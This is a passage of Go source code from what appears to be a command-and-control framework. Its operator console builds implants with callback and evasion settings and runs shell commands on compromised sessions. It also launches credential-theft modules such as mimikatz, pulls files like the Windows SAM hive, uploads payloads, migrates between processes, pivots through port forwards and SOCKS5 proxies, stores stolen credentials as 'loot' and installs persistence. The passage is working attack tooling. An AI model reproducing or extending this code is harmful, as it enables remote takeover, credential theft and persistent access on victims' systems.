		return fmt.Errorf("failed to write payload: %w", err)
	}

	// Save build to database
	modulesJSON, err := json.Marshal(options.Modules)
	if err != nil {
		is.logger.Error("Failed to marshal modules: %v", err)
		modulesJSON = []byte("[]") // Default to empty array on error
	}
	evasionJSON, err := json.Marshal(options.Evasion)
	if err != nil {
		is.logger.Error("Failed to marshal evasion: %v", err)
		evasionJSON = []byte("[]") // Default to empty array on error
	}

	build := &database.ImplantBuild{
		Name:        filepath.Base(outputPath),
		Type:        payloadType,
		OS:          osTarget,
		Arch:        arch,
		CallbackURL: callbackURL,
		Delay:       delay,
		Jitter:      jitter,
		UserAgent:   userAgent,
		Protocol:    protocol,
		OutputPath:  outputPath,
		Size:        int64(len(data)),
		Modules:     string(modulesJSON),
		Evasion:     string(evasionJSON),
	}

	if err := database.SaveImplantBuild(build); err != nil {
		is.logger.Error("Failed to save build to database: %v", err)
		// Continue anyway - build succeeded
	}

	fmt.Printf("[+] Payload generated successfully!\n")
	fmt.Printf("[+] Size: %d bytes\n", len(data))
	fmt.Printf("[+] Saved to: %s\n", outputPath)

	return nil
}

func (is *InteractiveServer) printJobs() {
	jobList := is.jobManager.ListJobs()

	if len(jobList) == 0 {
		fmt.Println("[*] No active jobs")
		return
	}

	t := table.NewWriter()
	t.SetStyle(table.StyleColoredBright)
	t.AppendHeader(table.Row{"ID", "Type", "Name", "Status", "Created"})

	for _, job := range jobList {
		t.AppendRow(table.Row{
			job.ID,
			job.Type,
			job.Name,
			job.Status,
			job.CreatedAt.Format("2006-01-02 15:04:05"),
		})
	}

	fmt.Println(t.Render())
}

func (is *InteractiveServer) printSessions() {
	sessionList := is.sessionMgr.ListSessions()

	if len(sessionList) == 0 {
		fmt.Println("[*] No active sessions")
		return
	}

	t := table.NewWriter()
	t.SetStyle(table.StyleColoredBright)
	t.AppendHeader(table.Row{"ID", "Type", "Transport", "Remote Addr", "Connected", "Last Seen", "State"})

	for _, session := range sessionList {
		// Get remote address from metadata if not set directly
		remoteAddr := session.RemoteAddr
		if remoteAddr == "" {
			if addr, ok := session.GetMetadata("remote_addr"); ok {
				if addrStr, ok := addr.(string); ok {
					remoteAddr = addrStr
				}
			}
		}
		
		t.AppendRow(table.Row{
			shortID(session.ID),
			session.Type,
			session.Transport,
			remoteAddr,
			session.ConnectedAt.Format("15:04:05"),
			session.LastSeen.Format("15:04:05"),
			session.GetState(),
		})
	}

	fmt.Println(t.Render())
}

func (is *InteractiveServer) handleUse(args []string) error {
	if len(args) == 0 {
		if is.currentSession != "" {
			fmt.Printf("[*] Currently using session: %s\n", shortID(is.currentSession))
			fmt.Println("[*] Type 'back' to exit session")
			return nil
		}
		return fmt.Errorf("insufficient arguments\n" +
			"  Usage: use <session_id>\n" +
			"  Use 'sessions' command to list all active sessions\n" +
			"  Example: use sess-123\n" +
			"  Note: You can use partial session IDs (first 8 characters)")
	}

	if args[0] == "back" {
		if is.currentSession != "" {
			fmt.Printf("[*] Exited session %s\n", shortID(is.currentSession))
			is.currentSession = ""
		} else {
			fmt.Println("[*] Not in a session")
		}
		return nil
	}

	sessionID := args[0]
	if sessionID == "" {
		return fmt.Errorf("session ID cannot be empty\n" +
			"  Usage: use <session_id>\n" +
			"  Use 'sessions' command to list all active sessions")
	}

	session, ok := is.sessionMgr.GetSession(sessionID)
	if !ok {
		return fmt.Errorf("session not found: %s\n"+
			"  Use 'sessions' command to list all active sessions\n"+
			"  Note: You can use partial session IDs (first 8 characters)", sessionID)
	}

	is.currentSession = sessionID
	fmt.Printf("[+] Using session %s\n", shortID(sessionID))
	fmt.Printf("    Type: %s\n", session.Type)
	fmt.Printf("    Transport: %s\n", session.Transport)
	fmt.Printf("    Remote: %s\n", session.RemoteAddr)
	fmt.Println("[*] Type commands to execute on session")
	fmt.Println("[*] Type 'back' to exit session")
	fmt.Println()

	// Enter interactive shell for session
	return is.sessionShell(sessionID)
}

func (is *InteractiveServer) sessionShell(sessionID string) error {
	if !is.isServerRunning() || is.server == nil {
		return fmt.Errorf("server not running")
	}

	// Create session-specific readline input
	sessionPrompt := fmt.Sprintf("[ditto %s] > ", shortID(sessionID))
	var sessionInput interactive.InputReader
	rlInput, err := interactive.NewReadlineInputWithCompleter(sessionPrompt, is.completer)
	if err != nil {
		// Fallback to simple input
		sessionInput = interactive.NewFallbackInput(sessionPrompt)
	} else {
		sessionInput = rlInput
	}
	defer func() {
		if sessionInput != nil {
			sessionInput.Close()
		}
	}()

	for {
		if is.currentSession != sessionID {
			break // Session changed
		}
		
		if sessionInput == nil {
			fmt.Printf("[!] Error: session input handler not initialized\n")
			break
		}
		
		// Validate session still exists before executing commands
		if _, ok := is.sessionMgr.GetSession(sessionID); !ok {
			fmt.Printf("[!] Session %s no longer exists\n", shortID(sessionID))
			is.currentSession = ""
			break
		}
		
		line, err := sessionInput.ReadLine()
		if err != nil {
			if err == io.EOF {
				break
			}
			fmt.Printf("[!] Error reading input: %v\n", err)
			continue
		}

		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}

		if line == "back" || line == "exit" {
			is.currentSession = ""
			break
		}

		parts := strings.Fields(line)
		if len(parts) == 0 {
			continue
		}

		command := parts[0]
		args := parts[1:]

		switch command {
		case "shell", "exec":
			if len(args) == 0 {
				fmt.Println("[!] Error: Command cannot be empty")
				fmt.Println("    Usage: shell <command>")
				fmt.Println("    Example: shell whoami")
				continue
			}
			if err := is.executeShellCommand(sessionID, strings.Join(args, " ")); err != nil {
				fmt.Printf("[!] Error: %v\n", err)
			}
		case "module", "run":
			if len(args) < 1 {
				fmt.Println("[!] Error: Module ID is required")
				fmt.Println("    Usage: module <module_id> [args...]")
				fmt.Println("    Example: module powershell/credentials/mimikatz")
				fmt.Println("    Use 'modules' command to list available modules")
				continue
			}
			if err := is.executeModule(sessionID, args[0], args[1:]); err != nil {
				fmt.Printf("[!] Error: %v\n", err)
			}
		case "download":
			if len(args) < 1 {
				fmt.Println("[!] Error: Remote path is required")
				fmt.Println("    Usage: download <remote_path>")
				fmt.Println("    Example: download C:\\Windows\\System32\\config\\sam")
				continue
			}
			if err := is.downloadFile(sessionID, args[0]); err != nil {
				fmt.Printf("[!] Error: %v\n", err)
			}
		case "upload":
			if len(args) < 2 {
				fmt.Println("[!] Error: Both local and remote paths are required")
				fmt.Println("    Usage: upload <local_path> <remote_path>")
				fmt.Println("    Example: upload /tmp/payload.exe C:\\Windows\\Temp\\payload.exe")
				continue
			}
			if err := is.uploadFile(sessionID, args[0], args[1]); err != nil {
				fmt.Printf("[!] Error: %v\n", err)
			}
		case "migrate":
			if len(args) < 1 {
				fmt.Println("[!] Error: Process ID is required")
				fmt.Println("    Usage: migrate <pid>")
				fmt.Println("    Example: migrate 1234")
				continue
			}
			pid, err := strconv.Atoi(args[0])
			if err != nil {
				fmt.Printf("[!] Error: Invalid process ID '%s': must be a number\n", args[0])
				fmt.Println("    Usage: migrate <pid>")
				fmt.Println("    Example: migrate 1234")
				continue
			}
			if pid <= 0 {
				fmt.Printf("[!] Error: Invalid process ID: %d (must be positive)\n", pid)
				fmt.Println("    Usage: migrate <pid>")
				fmt.Println("    Example: migrate 1234")
				continue
			}
			if err := is.migrateProcess(sessionID, pid); err != nil {
				fmt.Printf("[!] Error: %v\n", err)
			}
		case "cat":
			if len(args) < 1 {
				fmt.Println("[!] Error: File path is required")
				fmt.Println("    Usage: cat <path>")
				fmt.Println("    Example: cat /etc/passwd")
				continue
			}
			if err := is.executeFilesystemOp(sessionID, "cat", args[0]); err != nil {
				fmt.Printf("[!] Error: %v\n", err)
			}
		case "head":
			if len(args) < 1 {
				fmt.Println("[!] Error: File path is required")
				fmt.Println("    Usage: head <path> [lines]")
				fmt.Println("    Example: head /etc/passwd 20")
				continue
			}
			lines := 10
			if len(args) >= 2 {
				n, err := strconv.Atoi(args[1])
				if err != nil {
					fmt.Printf("[!] Error: Invalid line count '%s': must be a number\n", args[1])
					fmt.Println("    Usage: head <path> [lines]")
					fmt.Println("    Example: head /etc/passwd 20")
					continue
				}
				if n <= 0 {
					fmt.Printf("[!] Error: Line count must be positive, got %d\n", n)
					fmt.Println("    Usage: head <path> [lines]")
					fmt.Println("    Example: head /etc/passwd 20")
					continue
				}
				lines = n
			}
			if err := is.executeFilesystemOp(sessionID, "head", args[0], fmt.Sprintf("%d", lines)); err != nil {
				fmt.Printf("[!] Error: %v\n", err)
			}
		case "tail":
			if len(args) < 1 {
				fmt.Println("[!] Error: File path is required")
				fmt.Println("    Usage: tail <path> [lines]")
				fmt.Println("    Example: tail /var/log/syslog 50")
				continue
			}
			lines := 10
			if len(args) >= 2 {
				n, err := strconv.Atoi(args[1])
				if err != nil {
					fmt.Printf("[!] Error: Invalid line count '%s': must be a number\n", args[1])
					fmt.Println("    Usage: tail <path> [lines]")
					fmt.Println("    Example: tail /var/log/syslog 50")
					continue
				}
				if n <= 0 {
					fmt.Printf("[!] Error: Line count must be positive, got %d\n", n)
					fmt.Println("    Usage: tail <path> [lines]")
					fmt.Println("    Example: tail /var/log/syslog 50")
					continue
				}
				lines = n
			}
			if err := is.executeFilesystemOp(sessionID, "tail", args[0], fmt.Sprintf("%d", lines)); err != nil {
				fmt.Printf("[!] Error: %v\n", err)
			}
		case "grep":
			if len(args) < 2 {
				fmt.Println("[!] Error: Both pattern and path are required")
				fmt.Println("    Usage: grep <pattern> <path>")
				fmt.Println("    Example: grep 'ERROR' /var/log/app.log")
				continue
			}
			if err := is.executeFilesystemOp(sessionID, "grep", args[1], args[0]); err != nil {
				fmt.Printf("[!] Error: %v\n", err)
			}
		case "help", "h":
			fmt.Println("Session commands:")
			fmt.Println("  shell <command>  - Execute shell command")
			fmt.Println("  module <id>      - Execute module")
			fmt.Println("  migrate <pid>   - Migrate to another process")
			fmt.Println("  grep <pattern> <path> - Search file contents")
			fmt.Println("  head <path>      - Show first lines of file")
			fmt.Println("  tail <path>      - Show last lines of file")
			fmt.Println("  cat <path>       - Display file contents")
			fmt.Println("  download <path> - Download file")
			fmt.Println("  upload <local> <remote> - Upload file")
			fmt.Println("  back, exit       - Exit session")
		default:
			// Default to shell command
			if err := is.executeShellCommand(sessionID, line); err != nil {
				fmt.Printf("[!] Error: %v\n", err)
			}
		}
	}

	return nil
}

func (is *InteractiveServer) executeShellCommand(sessionID, command string) error {
	if is.server == nil {
		return fmt.Errorf("server not initialized\n" +
			"  Ensure the C2 server is running with 'server start'")
	}

	if command == "" {
		return fmt.Errorf("command cannot be empty\n" +
			"  Usage: shell <command>\n" +
			"  Example: shell whoami")
	}

	// Validate session exists
	if _, ok := is.sessionMgr.GetSession(sessionID); !ok {
		return fmt.Errorf("session not found: %s\n"+
			"  Session may have disconnected. Use 'sessions' to list active sessions", shortID(sessionID))
	}

	// Queue task for session
	task := &tasks.Task{
		ID:      fmt.Sprintf("task-%d", time.Now().UnixNano()),
		Type:    "shell",
		Command: command,
		Parameters: map[string]interface{}{
			"session_id": sessionID,
		},
	}
	is.server.EnqueueTask(task)
	fmt.Printf("[+] Queued command: %s\n", command)
	return nil
}

func (is *InteractiveServer) executeModule(sessionID, moduleID string, args []string) error {
	if is.server == nil {
		return fmt.Errorf("server not initialized\n" +
			"  Ensure the C2 server is running with 'server start'")
	}

	if moduleID == "" {
		return fmt.Errorf("module ID cannot be empty\n" +
			"  Usage: module <module_id> [args...]\n" +
			"  Example: module powershell/credentials/mimikatz\n" +
			"  Use 'modules' command to list available modules")
	}

	// Validate session exists
	if _, ok := is.sessionMgr.GetSession(sessionID); !ok {
		return fmt.Errorf("session not found: %s\n"+
			"  Session may have disconnected. Use 'sessions' to list active sessions", shortID(sessionID))
	}

	module, ok := is.moduleRegistry.GetModule(moduleID)
	if !ok {
		return fmt.Errorf("module not found: %s\n"+
			"  Use 'modules' command to list available modules\n"+
			"  Note: Module IDs are case-sensitive", moduleID)
	}

	// Validate module exists (we already checked above)
	_ = module
	params := make(map[string]interface{})
	params["session_id"] = sessionID
	for i := 0; i < len(args); i += 2 {
		if i+1 < len(args) {
			params[args[i]] = args[i+1]
		} else {
			// Single argument without value
			params[args[i]] = ""
		}
	}

	// Queue module task
	task := &tasks.Task{
		ID:         fmt.Sprintf("task-%d", time.Now().UnixNano()),
		Type:       "module",
		Command:    moduleID,
		Parameters: params,
	}
	is.server.EnqueueTask(task)
	fmt.Printf("[+] Queued module: %s (session: %s)\n", moduleID, shortID(sessionID))
	return nil
}

func (is *InteractiveServer) downloadFile(sessionID, remotePath string) error {
	if is.server == nil {
		return fmt.Errorf("server not initialized\n" +
			"  Ensure the C2 server is running with 'server start'")
	}

	if remotePath == "" {
		return fmt.Errorf("remote path cannot be empty\n" +
			"  Usage: download <remote_path>\n" +
			"  Example: download C:\\Windows\\System32\\config\\sam")
	}

	// Validate session exists
	if _, ok := is.sessionMgr.GetSession(sessionID); !ok {
		return fmt.Errorf("session not found: %s\n"+
			"  Session may have disconnected. Use 'sessions' to list active sessions", shortID(sessionID))
	}

	task := &tasks.Task{
		ID:      fmt.Sprintf("task-%d", time.Now().UnixNano()),
		Type:    "download",
		Command: remotePath,
		Parameters: map[string]interface{}{
			"session_id": sessionID,
		},
	}
	is.server.EnqueueTask(task)
	fmt.Printf("[+] Queued download: %s\n", remotePath)
	return nil
}

func (is *InteractiveServer) uploadFile(sessionID, localPath, remotePath string) error {
	if is.server == nil {
		return fmt.Errorf("server not initialized\n" +
			"  Ensure the C2 server is running with 'server start'")
	}

	if localPath == "" {
		return fmt.Errorf("local path cannot be empty\n" +
			"  Usage: upload <local_path> <remote_path>\n" +
			"  Example: upload /tmp/payload.exe C:\\Windows\\Temp\\payload.exe")
	}

	if remotePath == "" {
		return fmt.Errorf("remote path cannot be empty\n" +
			"  Usage: upload <local_path> <remote_path>\n" +
			"  Example: upload /tmp/payload.exe C:\\Windows\\Temp\\payload.exe")
	}

	// Check if local file exists
	if _, err := os.Stat(localPath); os.IsNotExist(err) {
		return fmt.Errorf("local file not found: %s\n"+
			"  Usage: upload <local_path> <remote_path>\n"+
			"  Note: Provide the full path to the file you want to upload\n"+
			"  Example: upload /tmp/payload.exe C:\\Windows\\Temp\\payload.exe", localPath)
	}

	// Validate session exists
	if _, ok := is.sessionMgr.GetSession(sessionID); !ok {
		return fmt.Errorf("session not found: %s\n"+
			"  Session may have disconnected. Use 'sessions' to list active sessions", shortID(sessionID))
	}

	data, err := os.ReadFile(localPath)
	if err != nil {
		return fmt.Errorf("failed to read file '%s': %w\n"+
			"  Check file permissions and ensure the file is readable", localPath, err)
	}

	task := &tasks.Task{
		ID:      fmt.Sprintf("task-%d", time.Now().UnixNano()),
		Type:    "upload",
		Command: remotePath,
		Parameters: map[string]interface{}{
			"session_id": sessionID,
			"data":       string(data),
		},
	}
	is.server.EnqueueTask(task)
	fmt.Printf("[+] Queued upload: %s -> %s (%d bytes)\n", localPath, remotePath, len(data))
	return nil
}

func (is *InteractiveServer) migrateProcess(sessionID string, pid int) error {
	if is.server == nil {
		return fmt.Errorf("server not initialized\n" +
			"  Ensure the C2 server is running with 'server start'")
	}

	if pid <= 0 {
		return fmt.Errorf("invalid process ID: %d (must be positive)\n"+
			"  Usage: migrate <pid>\n"+
			"  Example: migrate 1234", pid)
	}

	// Validate session exists
	if _, ok := is.sessionMgr.GetSession(sessionID); !ok {
		return fmt.Errorf("session not found: %s\n"+
			"  Session may have disconnected. Use 'sessions' to list active sessions", shortID(sessionID))
	}

	task := &tasks.Task{
		ID:      fmt.Sprintf("task-%d", time.Now().UnixNano()),
		Type:    "migrate",
		Command: fmt.Sprintf("%d", pid),
		Parameters: map[string]interface{}{
			"session_id": sessionID,
			"pid":        pid,
		},
	}
	is.server.EnqueueTask(task)
	fmt.Printf("[+] Queued process migration to PID %d\n", pid)
	return nil
}

func (is *InteractiveServer) executeFilesystemOp(sessionID, op string, path string, args ...string) error {
	if is.server == nil {
		return fmt.Errorf("server not initialized\n" +
			"  Ensure the C2 server is running with 'server start'")
	}

	if path == "" {
		usage := fmt.Sprintf("%s <path>", op)
		example := fmt.Sprintf("%s /etc/passwd", op)
		if op == "head" || op == "tail" {
			usage = fmt.Sprintf("%s <path> [lines]", op)
			example = fmt.Sprintf("%s /etc/passwd 20", op)
		} else if op == "grep" {
			usage = "grep <pattern> <path>"
			example = "grep 'ERROR' /var/log/app.log"
		}
		return fmt.Errorf("path cannot be empty for %s operation\n"+
			"  Usage: %s\n"+
			"  Example: %s", op, usage, example)
	}

	// Validate session exists
	if _, ok := is.sessionMgr.GetSession(sessionID); !ok {
		return fmt.Errorf("session not found: %s\n"+
			"  Session may have disconnected. Use 'sessions' to list active sessions", shortID(sessionID))
	}

	task := &tasks.Task{
		ID:      fmt.Sprintf("task-%d", time.Now().UnixNano()),
		Type:    "filesystem",
		Command: op,
		Parameters: map[string]interface{}{
			"session_id": sessionID,
			"path":       path,
			"args":       args,
		},
	}
	is.server.EnqueueTask(task)
	fmt.Printf("[+] Queued %s operation: %s\n", op, path)
	return nil
}

func (is *InteractiveServer) handlePortForward(args []string) error {
	var sessionID, localAddr, remoteAddr string

	// Determine if we're using current session or provided session ID
	if is.currentSession != "" {
		// Use current session - need local and remote addresses
		if len(args) < 2 {
			return fmt.Errorf("insufficient arguments\n" +
				"  Usage (with active session): port-forward <local_addr> <remote_addr>\n" +
				"  Usage (with session ID): port-forward <session_id> <local_addr> <remote_addr>\n" +
				"  Expected format: <host>:<port>\n" +
				"  Example: port-forward 127.0.0.1:8080 192.168.1.100:3389\n" +
				"  Example: port-forward sess-123 127.0.0.1:8080 192.168.1.100:3389")
		}
		sessionID = is.currentSession
		localAddr = args[0]
		remoteAddr = args[1]
	} else {
		// Session ID must be provided - need session_id, local, and remote
		if len(args) < 3 {
			return fmt.Errorf("insufficient arguments\n" +
				"  Usage: port-forward <session_id> <local_addr> <remote_addr>\n" +
				"  Expected format: <host>:<port>\n" +
				"  Example: port-forward sess-123 127.0.0.1:8080 192.168.1.100:3389\n" +
				"  Note: If you're in a session, you can omit the session_id")
		}
		sessionID = args[0]
		localAddr = args[1]
		remoteAddr = args[2]

		// Validate session exists
		if _, ok := is.sessionMgr.GetSession(sessionID); !ok {
			return fmt.Errorf("session not found: %s\n"+
				"  Use 'sessions' command to list all active sessions\n"+
				"  Note: You can use partial session IDs (first 8 characters)", sessionID)
		}
	}

	// Validate addresses
	if err := validateAddress(localAddr); err != nil {
		return fmt.Errorf("invalid local address '%s': %w\n"+
			"  Expected format: <host>:<port>\n"+
			"  Examples: 127.0.0.1:8080, 0.0.0.0:9000\n"+
			"  Note: Port must be between 1 and 65535", localAddr, err)
	}
	if err := validateAddress(remoteAddr); err != nil {
		return fmt.Errorf("invalid remote address '%s': %w\n"+
			"  Expected format: <host>:<port>\n"+
			"  Examples: 192.168.1.100:3389, 10.0.0.5:22\n"+
			"  Note: Port must be between 1 and 65535", remoteAddr, err)
	}

	pf, err := is.pivotManager.AddPortForward(sessionID, remoteAddr, localAddr)
	if err != nil {
		return fmt.Errorf("failed to create port forward: %w", err)
	}

	ctx := context.Background()
	if err := pf.Start(ctx, func(conn net.Conn) {
		// Forward connection through session
		// Create a task to establish remote connection on implant side
		if is.server == nil {
			is.logger.Error("Server is nil, cannot queue port forward task")
			conn.Close()
			return
		}
		
		task := &tasks.Task{
			ID:      fmt.Sprintf("task-%d", time.Now().UnixNano()),
			Type:    "portforward",
			Command: remoteAddr,
			Parameters: map[string]interface{}{
				"session_id":  sessionID,
				"local_addr":  localAddr,
				"remote_addr": remoteAddr,
				"conn_id":     fmt.Sprintf("conn-%d", time.Now().UnixNano()),
			},
		}
		is.server.EnqueueTask(task)

		is.logger.Info("Port forward connection from %s - task queued for session %s", conn.RemoteAddr(), sessionID)
		// Connection will be handled by implant when it receives the task
		// Close local connection as implant will handle forwarding
		conn.Close()
	}); err != nil {
		return fmt.Errorf("failed to start port forward: %w", err)
	}

	fmt.Printf("[+] Port forward created (ID: %d)\n", pf.ID)
	fmt.Printf("    Local: %s -> Remote: %s\n", localAddr, remoteAddr)
	return nil
}

func (is *InteractiveServer) handleSOCKS5(args []string) error {
	var sessionID, bindAddr, username, password string

	// Determine if we're using current session or provided session ID
	if is.currentSession != "" {
		// Use current session - need bind address
		if len(args) < 1 {
			return fmt.Errorf("insufficient arguments\n" +
				"  Usage (with active session): socks5 <bind_addr> [username] [password]\n" +
				"  Usage (with session ID): socks5 <session_id> <bind_addr> [username] [password]\n" +
				"  Expected format: <host>:<port>\n" +
				"  Example: socks5 127.0.0.1:1080\n" +
				"  Example: socks5 sess-123 127.0.0.1:1080 user pass")
		}
		sessionID = is.currentSession
		bindAddr = args[0]
		if len(args) >= 2 {
			username = args[1]
		}
		if len(args) >= 3 {
			password = args[2]
		}
	} else {
		// Session ID must be provided - need session_id and bind_addr
		if len(args) < 2 {
			return fmt.Errorf("insufficient arguments\n" +
				"  Usage: socks5 <session_id> <bind_addr> [username] [password]\n" +
				"  Expected format: <host>:<port>\n" +
				"  Example: socks5 sess-123 127.0.0.1:1080\n" +
				"  Example: socks5 sess-123 127.0.0.1:1080 user pass\n" +
				"  Note: If you're in a session, you can omit the session_id")
		}
		sessionID = args[0]
		bindAddr = args[1]
		if len(args) >= 3 {
			username = args[2]
		}
		if len(args) >= 4 {
			password = args[3]
		}

		// Validate session exists
		if _, ok := is.sessionMgr.GetSession(sessionID); !ok {
			return fmt.Errorf("session not found: %s\n"+
				"  Use 'sessions' command to list all active sessions\n"+
				"  Note: You can use partial session IDs (first 8 characters)", sessionID)
		}
	}

	// Validate bind address
	if err := validateAddress(bindAddr); err != nil {
		return fmt.Errorf("invalid bind address '%s': %w\n"+
			"  Expected format: <host>:<port>\n"+
			"  Examples: 127.0.0.1:1080, 0.0.0.0:9050\n"+
			"  Note: Port must be between 1 and 65535", bindAddr, err)
	}

	proxy, err := is.socksManager.AddSOCKS5(sessionID, bindAddr, username, password)
	if err != nil {
		return fmt.Errorf("failed to create SOCKS5 proxy: %w", err)
	}

	ctx := context.Background()
	if err := proxy.Start(ctx, func(conn net.Conn) {
		// Handle SOCKS5 protocol through session
		// Create a task to establish SOCKS5 proxy on implant side
		if is.server == nil {
			is.logger.Error("Server is nil, cannot queue SOCKS5 task")
			conn.Close()
			return
		}
		
		task := &tasks.Task{
			ID:      fmt.Sprintf("task-%d", time.Now().UnixNano()),
			Type:    "socks5",
			Command: bindAddr,
			Parameters: map[string]interface{}{
				"session_id": sessionID,
				"bind_addr":  bindAddr,
				"username":   username,
				"password":   password,
				"conn_id":    fmt.Sprintf("conn-%d", time.Now().UnixNano()),
			},
		}
		is.server.EnqueueTask(task)

		is.logger.Info("SOCKS5 connection from %s - task queued for session %s", conn.RemoteAddr(), sessionID)
		// Connection will be handled by implant when it receives the task
		// Close local connection as implant will handle proxying
		conn.Close()
	}); err != nil {
		return fmt.Errorf("failed to start SOCKS5 proxy: %w", err)
	}

	fmt.Printf("[+] SOCKS5 proxy started (ID: %d) on %s\n", proxy.ID, bindAddr)
	return nil
}

func (is *InteractiveServer) handleLoot(args []string) error {
	if len(args) == 0 {
		return is.printLoot()
	}

	switch args[0] {
	case "list", "ls":
		return is.printLoot()
	case "add":
		if len(args) < 3 {
			return fmt.Errorf("insufficient arguments\n" +
				"  Usage: loot add <type> <name> <data>\n" +
				"  Valid types: credential, file, token, hash\n" +
				"  Example: loot add credential admin_pass 'password123'\n" +
				"  Example: loot add file /etc/passwd 'file contents here'")
		}
		lootTypeStr := strings.ToLower(args[1])
		validLootTypes := map[string]bool{"credential": true, "file": true, "token": true, "hash": true}
		if !validLootTypes[lootTypeStr] {
			return fmt.Errorf("invalid loot type '%s'\n"+
				"  Valid types: credential, file, token, hash\n"+
				"  Usage: loot add <type> <name> <data>\n"+
				"  Example: loot add credential admin_pass 'password123'", args[1])
		}
		lootType := loot.LootType(lootTypeStr)
		name := args[2]
		data := []byte(strings.Join(args[3:], " "))
		if len(args) == 3 {
			data = []byte(name)
		}
		if name == "" {
			return fmt.Errorf("loot name cannot be empty\n" +
				"  Usage: loot add <type> <name> <data>\n" +
				"  Example: loot add credential admin_pass 'password123'")
		}
		id, err := is.lootManager.AddLoot(lootType, name, data, nil)
		if err != nil {
			return fmt.Errorf("failed to add loot: %w", err)
		}
		fmt.Printf("[+] Added loot: %s\n", id)
	case "get":
		if len(args) < 2 {
			return fmt.Errorf("insufficient arguments\n" +
				"  Usage: loot get <id>\n" +
				"  Use 'loot list' to see all loot items with their IDs")
		}
		if args[1] == "" {
			return fmt.Errorf("loot ID cannot be empty\n" +
				"  Usage: loot get <id>\n" +
				"  Use 'loot list' to see all loot items with their IDs")
		}
		item, err := is.lootManager.GetLoot(args[1])
		if err != nil {
			return fmt.Errorf("failed to get loot: %w\n"+
				"  Use 'loot list' to see all loot items with their IDs", err)
		}
		data, err := is.lootManager.DecryptLoot(item)
		if err != nil {
			return fmt.Errorf("failed to decrypt loot: %w", err)
		}
		fmt.Printf("[+] Loot %s:\n", item.ID)
		fmt.Printf("    Type: %s\n", item.Type)
		fmt.Printf("    Name: %s\n", item.Name)
		fmt.Printf("    Data: %s\n", string(data))
	case "remove", "rm":
		if len(args) < 2 {
			return fmt.Errorf("insufficient arguments\n" +
				"  Usage: loot remove <id>\n" +
				"  Use 'loot list' to see all loot items with their IDs")
		}
		if args[1] == "" {
			return fmt.Errorf("loot ID cannot be empty\n" +
				"  Usage: loot remove <id>\n" +
				"  Use 'loot list' to see all loot items with their IDs")
		}
		if err := is.lootManager.RemoveLoot(args[1]); err != nil {
			return fmt.Errorf("failed to remove loot: %w\n"+
				"  Use 'loot list' to see all loot items with their IDs", err)
		}
		fmt.Printf("[+] Removed loot: %s\n", args[1])
	case "export":
		data, err := is.lootManager.Export()
		if err != nil {
			return err
		}
		fmt.Println(string(data))
	default:
		return fmt.Errorf("unknown loot subcommand '%s'\n"+
			"  Usage: loot [list|add|get|remove|export]\n"+
			"  Commands:\n"+
			"    list, ls     - List all loot items\n"+
			"    add          - Add a new loot item\n"+
			"                   Usage: loot add <type> <name> <data>\n"+
			"    get          - Get loot item details\n"+
			"                   Usage: loot get <id>\n"+
			"    remove, rm   - Remove a loot item\n"+
			"                   Usage: loot remove <id>\n"+
			"    export       - Export all loot as JSON\n"+
			"  Examples:\n"+
			"    loot list\n"+
			"    loot add credential admin_pass 'password123'\n"+
			"    loot get loot-123\n"+
			"    loot remove loot-123", args[0])
	}

	return nil
}

func (is *InteractiveServer) printLoot() error {
	items := is.lootManager.ListLoot()
	if len(items) == 0 {
		fmt.Println("[*] No loot items")
		return nil
	}

	t := table.NewWriter()
	t.SetStyle(table.StyleColoredBright)
	t.AppendHeader(table.Row{"ID", "Type", "Name", "Created"})

	for _, item := range items {
		t.AppendRow(table.Row{
			shortID(item.ID),
			item.Type,
			item.Name,
			item.CreatedAt.Format("2006-01-02 15:04:05"),
		})
	}

	fmt.Println(t.Render())
	return nil
}

func (is *InteractiveServer) handlePersistence(args []string) error {
	if len(args) == 0 {
		return fmt.Errorf("insufficient arguments\n" +
			"  Usage: persist <action> <session_id>\n" +
			"  Actions: install, remove\n" +
			"  Example: persist install sess-123\n" +
			"  Note: If you're in a session, you can omit the session_id")
	}

	var action, sessionID string

	// Determine if we're using current session or provided session ID
	if is.currentSession != "" && len(args) == 1 {
		// Use current session - only action provided
		action = strings.ToLower(args[0])
		sessionID = is.currentSession
	} else if len(args) >= 2 {
		// Session ID provided
		action = strings.ToLower(args[0])
		sessionID = args[1]
	} else {
		return fmt.Errorf("insufficient arguments\n" +
			"  Usage: persist <action> <session_id>\n" +
			"  Actions: install, remove\n" +
			"  Example: persist install sess-123\n" +
			"  Note: If you're in a session, you can use: persist install")
	}

	// Validate action
	validActions := map[string]bool{"install": true, "remove": true}
	if !validActions[action] {
		return fmt.Errorf("invalid action '%s'\n"+
			"  Valid actions: install, remove\n"+
			"  Usage: persist <action> <session_id>\n"+
			"  Example: persist install sess-123", args[0])
	}

	// Validate session exists
	if _, ok := is.sessionMgr.GetSession(sessionID); !ok {
		return fmt.Errorf("session not found: %s\n"+
			"  Use 'sessions' command to list all active sessions\n"+
			"  Note: You can use partial session IDs (first 8 characters)", sessionID)
	}

	if !is.isServerRunning() || is.server == nil {
		return fmt.Errorf("server is not running - you must start the C2 server first\n" +
			"  Usage: server [<address>]\n" +
			"  Example: server 0.0.0.0:8443")
	}

	switch action {
	case "install":
		// Queue persistence installation task
		task := &tasks.Task{
			ID:      fmt.Sprintf("task-%d", time.Now().UnixNano()),
			Type:    "persist",
			Command: "install",
			Parameters: map[string]interface{}{
				"session_id": sessionID,
			},
		}
		is.server.EnqueueTask(task)
		fmt.Printf("[+] Queued persistence installation for session %s\n", shortID(sessionID))
	case "remove":
		task := &tasks.Task{
			ID:      fmt.Sprintf("task-%d", time.Now().UnixNano()),
			Type:    "persist",
			Command: "remove",
			Parameters: map[string]interface{}{
				"session_id": sessionID,
			},
		}
		is.server.EnqueueTask(task)
		fmt.Printf("[+] Queued persistence removal for session %s\n", shortID(sessionID))
	}

	return nil
}

func (is *InteractiveServer) handleImplants(args []string) error {
	builds, err := database.GetImplantBuilds()
	if err != nil {
		return fmt.Errorf("failed to retrieve implants: %w", err)
	}

	if len(builds) == 0 {
		fmt.Println("[*] No saved implants")
		return nil
	}

	t := table.NewWriter()
	t.SetStyle(table.StyleColoredBright)
	t.AppendHeader(table.Row{"ID", "Name", "Type", "OS", "Arch", "Size", "Created"})

	for _, build := range builds {
		t.AppendRow(table.Row{
			shortID(build.ID),
			build.Name,
			build.Type,
			build.OS,
			build.Arch,
			fmt.Sprintf("%d bytes", build.Size),
			time.Unix(build.CreatedAt, 0).Format("2006-01-02 15:04:05"),
		})
	}

	fmt.Println(t.Render())
	return nil
}

func (is *InteractiveServer) handleGetImplant(args []string) error {
